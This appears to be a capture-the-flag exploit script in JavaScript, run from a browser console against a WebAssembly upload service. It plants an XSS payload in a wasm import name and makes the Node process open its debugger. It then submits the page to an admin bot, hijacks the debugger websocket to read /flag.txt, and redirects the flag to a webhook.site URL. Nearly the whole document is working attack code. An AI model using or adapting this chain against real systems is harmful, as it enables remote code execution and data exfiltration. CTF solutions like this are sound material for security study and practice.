// run this inside a browser console on the ui so we have WabtModule handy
// also change/open up the webhook.site exfil link
WabtModule().then(async wabt => {
  let debuggerfn = await (await fetch("/upload", {
    method: "PUT",
    headers: { "Content-Type": "application/wasm" },
    body: wabt.parseWat('main.wast', `
      (module
        (import "process" "_kill" (func $kill (param i32) (param i32)))
        (func (export "main")
          ;; process.kill(0 = ourselves, 10 = SIGUSR1)
          i32.const 0
          i32.const 10
          call $kill
          ;; infinite loop to give us until timeout to attach debugger
          loop $loop
            br $loop
          end
        )
      )
    `).toBinary({log: false}).buffer
  })).text();
  let pagefn = await (await fetch("/upload", {
    method: "PUT",
    headers: { "Content-Type": "application/wasm" },
    body: wabt.parseWat('main.wast', `
      (module (import "process" "<script>eval(atob('` + btoa((async (debuggerfn) => {
        // === executed in the page
        const response = await fetch("/run/" + debuggerfn);
        const reader = response.body.getReader();
        let buf = "";
        let debuggerurl;
        while (1) {
            const {done, value} = await reader.read();
            if (done) break;
            buf += new TextDecoder().decode(value);
            if (buf.includes("\n")) {
                // debugger statement is done, immediately break
                // (we have only one second, if request ends we are already too late)
                debuggerurl = buf.split("Debugger listening on ").pop().split("\n").shift();
                break;
            }
        }
        // cross domain websocket
        let ws = new WebSocket(debuggerurl);
        // https://chromedevtools.github.io/devtools-protocol/tot/Runtime/
        ws.onopen = () => {
            ws.send(JSON.stringify({"id":0,"method":"Runtime.evaluate", "params":{
                "expression": "(" + (() => {
                    // === executed in sandbox.js in node
                    // inside nsjail we can't make network requests, so exfiltrate through stdout
                    const fs = require("fs");
                    return fs.readFileSync("/flag.txt").toString();
                }).toString() + ")()",
                "includeCommandLineAPI": true
            }}));
        };
        ws.onmessage = (event) => {
            console.log(event.data);
            const data = JSON.parse(event.data);
            if (!data.result) return;
            // exfiltrate flag
            window.location = "https://webhook.site/d8fd5461-4de2-4f30-9a1b-84c835a2ce3d?" + data.result.result.value;
        };
      }).toString()) + `'))('`+debuggerfn+`')</script>" (func (param i32))))`).toBinary({log: false}).buffer
  })).text();
  // give pagefn to /report
  const url = "http://localhost:1337/run/" + pagefn;
  console.log(url);
  await (await fetch('/report', {
      method: "POST",
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
      },
      body: "url=" + encodeURIComponent(url) +
          "&healthcheck_captcha_bypass=dee54036-d87e-4ba0-a2a8-118b32641f5d"
  })).text();
});
